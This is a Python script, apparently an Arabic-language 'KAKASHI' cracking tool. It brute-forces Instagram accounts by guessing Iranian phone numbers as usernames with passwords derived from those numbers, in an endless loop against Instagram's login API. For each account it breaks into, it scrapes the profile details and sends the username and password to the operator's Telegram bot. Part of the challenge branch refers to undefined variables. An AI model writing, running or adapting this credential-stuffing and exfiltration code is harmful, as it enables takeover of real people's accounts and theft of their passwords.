from typing import Mapping


try:
    import random,requests,os,uuid,time,secrets
    from uuid import uuid4
except ModuleNotFoundError:
    os.system('pip install time')
    os.system('pip install uuid')
    os.system('pip install random')
    os.system('pip install requests')

BRed="\033[1;31m" # Red
BGreen="\033[1;32m" # Green
BYellow="\033[1;33m" # Yellow
BBlue="\033[1;34m" # Blue
BPurple="\033[1;35m" # Purple
BCyan="\033[1;36m" # Cyan
BWhite="\033[1;37m" # White
lo = '— —'

print("""

"""+BWhite+""" < """+BYellow+""" The KAKASHI SENSEI """+BWhite+""" >

  """+BRed+""" 
"""+BYellow+""" 
"""+BRed+""" @V6V_V
"""+BYellow+""" KAKASHI SENSEI
"""+BRed+""" 
                                        
"""+BRed+"""▷ """+BWhite+"""—— —— ——  —— —— ——  —— ——"""+BRed+"""◁
"""+BRed+""" ⁂  𝙙𝙚𝙫𝙡𝙡𝙤𝙥𝙚𝙧 𝙘𝙝𝙖𝙣𝙣𝙚𝙡  """+BWhite+""" ¦ """+BYellow+"""     @QQQQQQ2Q
"""+BRed+""" ⁂  𝙫𝙚𝙧𝙨𝙞𝙤𝙣 """+BWhite+""" ¦ """+BYellow+""" KAKASHI
"""+BRed+""" ⁂ 𝙙𝙚𝙫𝙡𝙡𝙤𝙥𝙚𝙧 𝙩𝙚𝙡𝙚 """+BWhite+""" ¦ """+BYellow+""" @V6V_V 
"""+BRed+"""▷ """+BWhite+"""—— 
━━━━━━━━━━━━━
—— ——  —— —— ——  —— —— ——  —— —— ——  —— —— —— ——"""+BYellow+"""◁                                         
""")
print(' ')
print(BRed+lo*22)
print(' ')                               
myadmin = input("  "+BYellow+"- Send Your ID : ")
tele = input("  "+BGreen+"- Send Your Token :  ")
os.system('clear')
print("""
   """+BRed+"""
"""+BGreen+""" 
"""+BRed+"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 _  __    _    _  __    _    ____  _   _ ___ 
| |/ /   / \  | |/ /   / \  / ___|| | | |_ _|
| ' /   / _ \ | ' /   / _ \ \___ \| |_| || | 
| . \  / ___ \| . \  / ___ \ ___) |  _  || | 
|_|\_\/_/   \_\_|\_\/_/   \_\____/|_| |_|___|                            

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  """)
print(' ')
print(BGreen+lo*22)
print(' ')
def info(user2,pasw):
    global tele,myadmin,mess
    cookie = secrets.token_hex(8)*2
    headr = {
        'HOST': "www.instagram.com",
        'KeepAlive' : 'True',
        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
        'Cookie': 'cookie',
        'Accept' : "*/*",
        'ContentType' : "application/x-www-form-urlencoded",
        "X-Requested-With" : "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-Instagram-AJAX" : "missing",
        "X-CSRFToken" : "missing",
        "Accept-Language" : "en-US,en;q=0.9"}
    url2 = f'https://www.instagram.com/{user2}/?__a=1'
    ree = requests.get(url2,headers=headr).json()
    name = str(ree['graphql']['user']['full_name'])
    id = str(ree['graphql']['user']['id'])
    followes = str(ree['graphql']['user']['edge_followed_by']['count'])
    following = str(ree['graphql']['user']['edge_follow']['count'])
    isp = str(ree['graphql']['user']['is_private'])
    ids = str(ree['graphql']['user']['id'])
    bio = str(ree['graphql']['user']['biography'])
    re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")   
    ree = re.json()
    datee = ree['data']
    ms = f"""
⌯ كاكاشي جابلك حاساب 🃏
< == == == == == == == == >
⌯ اليوزر   : {user2}
⌯ الاسم : {name}
⌯ باسورد : {pasw} 
⌯ المتابعين: {followes}
⌯ المتابعهم : {following}
⌯ خاص : {isp}
⌯ الايدي : {ids}
⌯ البايو : {bio}
⌯ التاريخ : {datee}

< == == == == == == == == >
⌯ ئلمطور : @V6V_V 🤍
"""
    requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text={ms}""")    
    print(BGreen+ms)

while True:
    chars = '0987654321'
    u = '933'
    u1 = str("". join(random.choice(chars)for i in range(7)))
    u2 = str("". join(random.choice(u)for i in range(1)))
    user = '+98'+u+u1
    pasw = '0'+u+u1
    url = 'https://i.instagram.com/api/v1/accounts/login/'          
    headers = {'User-Agent': 'User-Agent: Instagram 6.12.1 Android (22/5.1.1; 240dpi; 540x960; samsung; SM-G531H; grandprimeve3g; sc8830; fr_FR)',  'Accept':'*/*', 
         'Cookie':'missing', 
         'Accept-Encoding':'gzip', 
         'Accept-Language':'fr-FR, en-US', 
         'X-IG-Capabilities':'AQ==', 
         'X-IG-Connection-Type':'MOBILE(HSPA+)', 
         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
         'Host':'i.instagram.com'}
    uid = str(uuid4())
    data = {
    	'uuid':uid,'password':pasw, 
         'username':user, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
    req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
    if 'logged_in_user' in req_login.text:
        user2 = req_login.json()['logged_in_user']['username']
        info(user2,pasw)
    elif '"message":"challenge_required","challenge"' in req_login.text:
        print("  "+BYellow+f"  ⌯ Secure Acc --> "+BWhite+" :"+BYellow+f" {user}:{pasw} ")
        requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= جار فحص\n\n KAKASHI \n✔️\n√ @V6V_V  |√\
  \nصيدك✔️»[{zz}]\n-\u300aبالفرن✖️ [{aa}]")
    else:
        print("  "+BRed+f"  ⌯ اصبر --> "+BWhite+" :"+BRed+f" {user}:{pasw} ")
    
# تحتاجون شي راسلوني تلي @V6V_V